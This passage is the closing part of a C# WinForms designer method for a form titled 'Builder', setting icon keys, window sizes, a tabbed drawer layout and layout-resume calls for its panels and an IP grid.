		this.imageList1.Images.SetKeyName(0, "-build_90148.png");
		this.imageList1.Images.SetKeyName(1, "file_settings_icon_207200.png");
		this.imageList1.Images.SetKeyName(2, "settings-cogwheel-button_icon-icons.com_72559.png");
		this.imageList1.Images.SetKeyName(3, "server_78939.png");
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(879, 469);
		base.Controls.Add(this.materialTabControl1);
		base.DrawerAutoHide = false;
		base.DrawerShowIconsWhenHidden = true;
		base.DrawerTabControl = this.materialTabControl1;
		this.MinimumSize = new System.Drawing.Size(809, 465);
		base.Name = "FormBulider";
		this.Text = "Builder";
		base.Load += new System.EventHandler(FormBulider_Load);
		this.materialTabControl1.ResumeLayout(false);
		this.tabPage1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.GridIps).EndInit();
		this.tabPage2.ResumeLayout(false);
		this.tabPage2.PerformLayout();
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		this.tabPage3.ResumeLayout(false);
		this.tabPage3.PerformLayout();
		this.panel4.ResumeLayout(false);
		this.panel4.PerformLayout();
		this.panel3.ResumeLayout(false);
		this.panel3.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		this.tabPage4.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
